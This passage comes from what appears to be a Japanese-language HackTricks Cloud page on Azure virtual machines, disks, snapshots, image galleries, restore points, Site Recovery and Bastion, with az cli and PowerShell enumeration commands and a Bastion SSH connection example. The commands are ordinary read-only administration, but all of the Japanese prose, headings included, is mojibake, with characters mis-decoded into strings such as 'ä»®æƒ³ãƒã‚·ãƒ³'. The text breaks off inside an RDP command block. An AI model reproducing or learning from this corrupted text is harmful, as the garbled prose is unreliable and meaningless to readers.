# Az - ä»®æƒ³ãƒã‚·ãƒ³ã¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## Azureãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°åŸºæœ¬æƒ…å ±

Azureãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ã¯**ç•°ãªã‚‹ã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã¨æ§‹æˆæ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚** æ§˜ã€…ãªAzureãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã®**ç°¡å˜ãªèª¬æ˜ã€** **ä¾‹ã€** ãŠã‚ˆã³ **åˆ—æŒ™** ã‚³ãƒãƒ³ãƒ‰ã¯ä»¥ä¸‹ã«ã‚ã‚Šã¾ã™ï¼š

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## VMsåŸºæœ¬æƒ…å ±

Azureä»®æƒ³ãƒã‚·ãƒ³ï¼ˆVMï¼‰ã¯ã€æŸ”è»Ÿã§ã‚ªãƒ³ãƒ‡ãƒãƒ³ãƒ‰ã®**ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ™ãƒ¼ã‚¹ã®ã‚µãƒ¼ãƒãƒ¼ã§ã€Windowsã¾ãŸã¯Linuxã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚** ç‰©ç†ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ã‚’ç®¡ç†ã™ã‚‹ã“ã¨ãªãã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚„ãƒ¯ãƒ¼ã‚¯ãƒ­ãƒ¼ãƒ‰ã‚’å±•é–‹ã§ãã¾ã™ã€‚Azure VMsã¯ã€ç‰¹å®šã®ãƒ‹ãƒ¼ã‚ºã«å¿œã˜ã¦ã•ã¾ã–ã¾ãªCPUã€ãƒ¡ãƒ¢ãƒªã€ãŠã‚ˆã³ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§æ§‹æˆã§ãã€ä»®æƒ³ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã€ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ãªã©ã®Azureã‚µãƒ¼ãƒ“ã‚¹ã¨çµ±åˆã§ãã¾ã™ã€‚

### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ§‹æˆ

* **å¯ç”¨æ€§ã‚¾ãƒ¼ãƒ³**ï¼šå¯ç”¨æ€§ã‚¾ãƒ¼ãƒ³ã¯ã€ç‰¹å®šã®Azureãƒªãƒ¼ã‚¸ãƒ§ãƒ³å†…ã®ç‰©ç†çš„ã«åˆ†é›¢ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚»ãƒ³ã‚¿ãƒ¼ã®ç•°ãªã‚‹ã‚°ãƒ«ãƒ¼ãƒ—ã§ã‚ã‚Šã€ãƒ­ãƒ¼ã‚«ãƒ«ã®éšœå®³ã‚„ç½å®³ã«ã‚ˆã£ã¦è¤‡æ•°ã®ã‚¾ãƒ¼ãƒ³ãŒå½±éŸ¿ã‚’å—ã‘ã‚‹ãƒªã‚¹ã‚¯ã‚’æœ€å°é™ã«æŠ‘ãˆã¾ã™ã€‚
* **ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¿ã‚¤ãƒ—**ï¼š
* **æ¨™æº–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£**ï¼šã“ã‚Œã¯ç‰¹åˆ¥ãªæ§‹æˆã‚’å¿…è¦ã¨ã—ãªã„ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¿ã‚¤ãƒ—ã§ã™ã€‚
* **ä¿¡é ¼ã§ãã‚‹èµ·å‹•**ï¼šã“ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¿ã‚¤ãƒ—ã¯ã€Secure BootãŠã‚ˆã³ä»®æƒ³ä¿¡é ¼ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ï¼ˆvTPMï¼‰ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ–ãƒ¼ãƒˆã‚­ãƒƒãƒˆã‚„ã‚«ãƒ¼ãƒãƒ«ãƒ¬ãƒ™ãƒ«ã®ãƒãƒ«ã‚¦ã‚§ã‚¢ã«å¯¾ã™ã‚‹ä¿è­·ã‚’å¼·åŒ–ã—ã¾ã™ã€‚
* **æ©Ÿå¯†VM**ï¼šä¿¡é ¼ã§ãã‚‹èµ·å‹•ã«åŠ ãˆã¦ã€VMã€ãƒã‚¤ãƒ‘ãƒ¼ãƒã‚¤ã‚¶ãƒ¼ã€ãŠã‚ˆã³ãƒ›ã‚¹ãƒˆç®¡ç†é–“ã®ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ãƒ™ãƒ¼ã‚¹ã®åˆ†é›¢ã‚’æä¾›ã—ã€ãƒ‡ã‚£ã‚¹ã‚¯æš—å·åŒ–ã‚’æ”¹å–„ã—ã€[**è©³ç´°**](https://learn.microsoft.com/en-us/azure/confidential-computing/confidential-vm-overview)**ã‚’æä¾›ã—ã¾ã™ã€‚**
* **èªè¨¼**ï¼šãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯æ–°ã—ã„**SSHã‚­ãƒ¼ãŒç”Ÿæˆã•ã‚Œã¾ã™**ãŒã€å…¬é–‹éµã‚’ä½¿ç”¨ã™ã‚‹ã‹ã€ä»¥å‰ã®ã‚­ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¯**azureuser**ã§ã™ã€‚**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã‚ˆã†ã«æ§‹æˆã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚**
* **VMãƒ‡ã‚£ã‚¹ã‚¯æš—å·åŒ–**ï¼šãƒ‡ã‚£ã‚¹ã‚¯ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ç®¡ç†ã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦é™æ­¢çŠ¶æ…‹ã§æš—å·åŒ–ã•ã‚Œã¾ã™ã€‚
* **ãƒ›ã‚¹ãƒˆã§ã®æš—å·åŒ–**ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã€ãƒ‡ãƒ¼ã‚¿ã¯ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‚µãƒ¼ãƒ“ã‚¹ã«é€ä¿¡ã™ã‚‹å‰ã«ãƒ›ã‚¹ãƒˆã§æš—å·åŒ–ã•ã‚Œã€ãƒ›ã‚¹ãƒˆã¨ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‚µãƒ¼ãƒ“ã‚¹é–“ã®ã‚¨ãƒ³ãƒ‰ãƒ„ãƒ¼ã‚¨ãƒ³ãƒ‰ã®æš—å·åŒ–ãŒä¿è¨¼ã•ã‚Œã¾ã™ï¼ˆ[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**](https://learn.microsoft.com/en-gb/azure/virtual-machines/disk-encryption#encryption-at-host---end-to-end-encryption-for-your-vm-data)ï¼‰ã€‚
* **NICãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—**ï¼š
* **ãªã—**ï¼šåŸºæœ¬çš„ã«ã™ã¹ã¦ã®ãƒãƒ¼ãƒˆã‚’é–‹æ”¾ã—ã¾ã™
* **åŸºæœ¬**ï¼šHTTPï¼ˆ80ï¼‰ã€HTTPSï¼ˆ443ï¼‰ã€SSHï¼ˆ22ï¼‰ã€RDPï¼ˆ3389ï¼‰ã®å—ä¿¡ãƒãƒ¼ãƒˆã‚’ç°¡å˜ã«é–‹æ”¾ã§ãã¾ã™
* **é«˜åº¦**ï¼šã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—ã‚’é¸æŠã—ã¾ã™
* **ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—**ï¼š**æ¨™æº–**ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—ï¼ˆ1æ—¥1å›ï¼‰ãŠã‚ˆã³**å¼·åŒ–**ï¼ˆ1æ—¥è¤‡æ•°å›ï¼‰ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™
* **ãƒ‘ãƒƒãƒã‚ªãƒ¼ã‚±ã‚¹ãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚ªãƒ—ã‚·ãƒ§ãƒ³**ï¼šã“ã‚Œã¯ã€é¸æŠã—ãŸãƒãƒªã‚·ãƒ¼ã«å¾“ã£ã¦VMã«è‡ªå‹•çš„ã«ãƒ‘ãƒƒãƒã‚’é©ç”¨ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ï¼ˆ[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**](https://learn.microsoft.com/en-us/azure/virtual-machines/automatic-vm-guest-patching)ã«è¨˜è¼‰ï¼‰ã€‚
* **ã‚¢ãƒ©ãƒ¼ãƒˆ**ï¼šVMã§ä½•ã‹ãŒç™ºç”Ÿã—ãŸã¨ãã«ã€ãƒ¡ãƒ¼ãƒ«ã¾ãŸã¯ãƒ¢ãƒã‚¤ãƒ«ã‚¢ãƒ—ãƒªã§è‡ªå‹•çš„ã«ã‚¢ãƒ©ãƒ¼ãƒˆã‚’å—ã‘å–ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ«ãƒ¼ãƒ«ï¼š
* CPUä½¿ç”¨ç‡ãŒ80ï¼…ã‚’è¶…ãˆã‚‹
* åˆ©ç”¨å¯èƒ½ãªãƒ¡ãƒ¢ãƒªãƒã‚¤ãƒˆãŒ1GBæœªæº€
* ãƒ‡ãƒ¼ã‚¿ãƒ‡ã‚£ã‚¹ã‚¯IOPSæ¶ˆè²»ç‡ãŒ95ï¼…ã‚’è¶…ãˆã‚‹
* OS IOPSæ¶ˆè²»ç‡ãŒ95ï¼…ã‚’è¶…ãˆã‚‹
* ç·ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãŒ500GBã‚’è¶…ãˆã‚‹
* ç·ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ã‚¦ãƒˆãŒ200GBã‚’è¶…ãˆã‚‹
* VmAvailabilityMetricãŒ1æœªæº€
* **ãƒ˜ãƒ«ã‚¹ãƒ¢ãƒ‹ã‚¿ãƒ¼**ï¼šãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ãƒãƒ¼ãƒˆ80ã®HTTPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™
* **ãƒ­ãƒƒã‚¯**ï¼šVMã‚’ãƒ­ãƒƒã‚¯ã—ã¦ã€èª­ã¿å–ã‚Šå°‚ç”¨ï¼ˆ**ReadOnly**ãƒ­ãƒƒã‚¯ï¼‰ã¾ãŸã¯èª­ã¿å–ã‚Šã¨æ›´æ–°ã¯å¯èƒ½ã ãŒå‰Šé™¤ã¯ã§ããªã„ï¼ˆ**CanNotDelete**ãƒ­ãƒƒã‚¯ï¼‰çŠ¶æ…‹ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* ã»ã¨ã‚“ã©ã®VMé–¢é€£ãƒªã‚½ãƒ¼ã‚¹ã‚‚**ãƒ­ãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆ**ã—ã¦ã„ã¾ã™ï¼ˆãƒ‡ã‚£ã‚¹ã‚¯ã€ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆãªã©ï¼‰ã€‚
* ãƒ­ãƒƒã‚¯ã¯**ãƒªã‚½ãƒ¼ã‚¹ã‚°ãƒ«ãƒ¼ãƒ—ãŠã‚ˆã³ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ¬ãƒ™ãƒ«**ã§ã‚‚é©ç”¨ã§ãã¾ã™ã€‚

## ãƒ‡ã‚£ã‚¹ã‚¯ã¨ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆ

* **2ã¤ä»¥ä¸Šã®VMã«ãƒ‡ã‚£ã‚¹ã‚¯ã‚’æ¥ç¶šã™ã‚‹ã“ã¨ã‚’æœ‰åŠ¹ã«ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
* ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ã™ã¹ã¦ã®ãƒ‡ã‚£ã‚¹ã‚¯ã¯**ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚­ãƒ¼ã§æš—å·åŒ–**ã•ã‚Œã¦ã„ã¾ã™ã€‚
* ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã§ã‚‚åŒæ§˜ã§ã™ã€‚
* ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**ã™ã¹ã¦ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‹ã‚‰ãƒ‡ã‚£ã‚¹ã‚¯ã‚’å…±æœ‰ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ãŒã€ç‰¹å®šã®**ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚¢ã‚¯ã‚»ã‚¹**ã®ã¿ã«**åˆ¶é™**ã™ã‚‹ã‹ã€**å…¬é–‹ãŠã‚ˆã³ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚¢ã‚¯ã‚»ã‚¹ã‚’å®Œå…¨ã«ç„¡åŠ¹ã«ã™ã‚‹**ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚
* ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã§ã‚‚åŒæ§˜ã§ã™ã€‚
* **ãƒ‡ã‚£ã‚¹ã‚¯ã‚’ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã™ã‚‹ãŸã‚ã®SAS URI**ï¼ˆæœ€å¤§60æ—¥ï¼‰ã‚’**ç”Ÿæˆã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã€èªè¨¼ã‚’è¦æ±‚ã™ã‚‹ã‚ˆã†ã«è¨­å®šã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
* ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã§ã‚‚åŒæ§˜ã§ã™ã€‚

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# List all disks
az disk list --output table

# Get info about a disk
az disk show --name <disk-name> --resource-group <rsc-group>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# List all disks
Get-AzDisk

# Get info about a disk
Get-AzDisk -Name <DiskName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}


## ã‚¤ãƒ¡ãƒ¼ã‚¸ã€ã‚®ãƒ£ãƒ©ãƒªãƒ¼ã‚¤ãƒ¡ãƒ¼ã‚¸ & ãƒªã‚¹ãƒˆã‚¢ãƒã‚¤ãƒ³ãƒˆ

**VMã‚¤ãƒ¡ãƒ¼ã‚¸**ã¯ã€æ–°ã—ã„ä»®æƒ³ãƒã‚·ãƒ³ï¼ˆVMï¼‰ã‚’**ä½œæˆã™ã‚‹ãŸã‚ã«å¿…è¦ãªã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³è¨­å®šã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’å«ã‚€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ**ã§ã™ã€‚ã‚¤ãƒ¡ãƒ¼ã‚¸ã¨ãƒ‡ã‚£ã‚¹ã‚¯ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã®é•ã„ã¯ã€ãƒ‡ã‚£ã‚¹ã‚¯ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆãŒå˜ä¸€ã®ç®¡ç†ãƒ‡ã‚£ã‚¹ã‚¯ã®èª­ã¿å–ã‚Šå°‚ç”¨ã®æ™‚ç‚¹ã‚³ãƒ”ãƒ¼ã§ã‚ã‚Šã€ä¸»ã«ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—ã‚„ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã«ä½¿ç”¨ã•ã‚Œã‚‹ã®ã«å¯¾ã—ã€ã‚¤ãƒ¡ãƒ¼ã‚¸ã¯**è¤‡æ•°ã®ãƒ‡ã‚£ã‚¹ã‚¯ã‚’å«ã‚€ã“ã¨ãŒã§ãã€æ–°ã—ã„VMã‚’ä½œæˆã™ã‚‹ãŸã‚ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¨ã—ã¦æ©Ÿèƒ½ã™ã‚‹ã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™**ã€‚\
ã‚¤ãƒ¡ãƒ¼ã‚¸ã¯ã€Azureã®**ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚»ã‚¯ã‚·ãƒ§ãƒ³**ã¾ãŸã¯**Azureã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ãƒˆã‚®ãƒ£ãƒ©ãƒªãƒ¼**å†…ã§ç®¡ç†ã§ãã€ã“ã‚Œã«ã‚ˆã‚Š**ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’ç”Ÿæˆã—ãŸã‚Šã€ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ãƒ†ãƒŠãƒ³ãƒˆé–“ã§**å…±æœ‰**ã—ãŸã‚Šã€ã•ã‚‰ã«ã¯å…¬é–‹ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

**ãƒªã‚¹ãƒˆã‚¢ãƒã‚¤ãƒ³ãƒˆ**ã¯ã€VMã®æ§‹æˆã¨ã€VMã«æ¥ç¶šã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ç®¡ç†ãƒ‡ã‚£ã‚¹ã‚¯ã®**æ™‚ç‚¹ã§ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³æ•´åˆæ€§ã®ã‚ã‚‹ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆ**ã‚’ä¿å­˜ã—ã¾ã™ã€‚ã“ã‚Œã¯VMã«é–¢é€£ã—ã¦ãŠã‚Šã€ãã®ç›®çš„ã¯ç‰¹å®šã®æ™‚ç‚¹ã§ã®VMã‚’å¾©å…ƒã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã™ã€‚

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shaerd with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
## List all galleries and get info about one
Get-AzGallery
Get-AzGallery -Name <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all image definitions in a gallery and get info about one
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName> -Name <ImageDefinitionName>

## List all the versions of an image definition in a gallery
Get-AzGalleryImageVersion -GalleryImageDefinitionName <ImageName> -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all VM applications inside a gallery
Get-AzGalleryApplication -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

# Images
# List all managed images in your subscription
Get-AzImage -Name <ResourceName> -ResourceGroupName <ResourceGroupName>

# Restore points
## List all restore points and get info about 1
Get-AzRestorePointCollection -Name <CollectionName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Azure Site Recovery

[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**](https://learn.microsoft.com/en-us/azure/site-recovery/site-recovery-overview)ã‹ã‚‰: Site Recoveryã¯ã€éšœå®³æ™‚ã«ãƒ“ã‚¸ãƒã‚¹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨ãƒ¯ãƒ¼ã‚¯ãƒ­ãƒ¼ãƒ‰ã‚’ç¨¼åƒã•ã›ã‚‹ã“ã¨ã§ã€ãƒ“ã‚¸ãƒã‚¹ã®ç¶™ç¶šæ€§ã‚’ç¢ºä¿ã—ã¾ã™ã€‚Site Recoveryã¯ã€ç‰©ç†ãŠã‚ˆã³ä»®æƒ³ãƒã‚·ãƒ³ï¼ˆVMï¼‰ã§ç¨¼åƒã—ã¦ã„ã‚‹ãƒ¯ãƒ¼ã‚¯ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ—ãƒ©ã‚¤ãƒãƒªã‚µã‚¤ãƒˆã‹ã‚‰ã‚»ã‚«ãƒ³ãƒ€ãƒªãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«**ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ãƒˆ**ã—ã¾ã™ã€‚ãƒ—ãƒ©ã‚¤ãƒãƒªã‚µã‚¤ãƒˆã§éšœå®³ãŒç™ºç”Ÿã—ãŸå ´åˆã€ã‚»ã‚«ãƒ³ãƒ€ãƒªãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ•ã‚§ã‚¤ãƒ«ã‚ªãƒ¼ãƒãƒ¼ã—ã€ãã“ã‹ã‚‰ã‚¢ãƒ—ãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚ãƒ—ãƒ©ã‚¤ãƒãƒªãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒå†ç¨¼åƒã—ãŸå¾Œã€å…ƒã«æˆ»ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

## Azure Bastion

Azure Bastionã¯ã€Azureãƒãƒ¼ã‚¿ãƒ«ã¾ãŸã¯ã‚¸ãƒ£ãƒ³ãƒ—ãƒœãƒƒã‚¯ã‚¹ã‚’ä»‹ã—ã¦ã€ä»®æƒ³ãƒã‚·ãƒ³ï¼ˆVMï¼‰ã¸ã®å®‰å…¨ã§ã‚·ãƒ¼ãƒ ãƒ¬ã‚¹ãª**ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ãƒ—ãƒ­ãƒˆã‚³ãƒ«ï¼ˆRDPï¼‰**ãŠã‚ˆã³**ã‚»ã‚­ãƒ¥ã‚¢ã‚·ã‚§ãƒ«ï¼ˆSSHï¼‰**ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€VMã«å¯¾ã™ã‚‹**ãƒ‘ãƒ–ãƒªãƒƒã‚¯IPã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¿…è¦æ€§ã‚’æ’é™¤**ã—ã¾ã™ã€‚&#x20;

Bastionã¯ã€å¿…è¦ãªVNetã«`/26`ã®ãƒãƒƒãƒˆãƒã‚¹ã‚¯ã‚’æŒã¤**`AzureBastionSubnet`**ã¨ã„ã†ã‚µãƒ–ãƒãƒƒãƒˆã‚’ãƒ‡ãƒ—ãƒ­ã‚¤ã—ã¾ã™ã€‚ãã®å¾Œã€ãƒ–ãƒ©ã‚¦ã‚¶ã‚’ä½¿ç”¨ã—ã¦`RDP`ãŠã‚ˆã³`SSH`ã‚’ä»‹ã—ã¦å†…éƒ¨VMã«**æ¥ç¶š**ã§ãã€VMã®ãƒãƒ¼ãƒˆã‚’ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«å…¬é–‹ã™ã‚‹ã“ã¨ã‚’é¿ã‘ã¾ã™ã€‚ã¾ãŸã€**ã‚¸ãƒ£ãƒ³ãƒ—ãƒ›ã‚¹ãƒˆ**ã¨ã—ã¦ã‚‚æ©Ÿèƒ½ã—ã¾ã™ã€‚

ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³å†…ã®ã™ã¹ã¦ã®Azure Bastionãƒ›ã‚¹ãƒˆã‚’ãƒªã‚¹ãƒˆã—ã€ãã‚Œã‚‰ã‚’ä»‹ã—ã¦VMã«æ¥ç¶šã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã§ãã¾ã™:

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# List bastions
az network bastion list -o table

# Connect via SSH through bastion
az network bastion ssh \
--name MyBastion \
--resource-group MyResourceGroup \
--target-resource-id /subscriptions/12345678-1234-1234-1234-123456789abc/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/MyVM \
--auth-type ssh-key \
--username azureuser \
--ssh-key ~/.ssh/id_rsa

# Connect via RDP through bastion
az network bastion rdp \
--name <BASTION_NAME> \
--resource-group <RESOURCE_GROUP> \
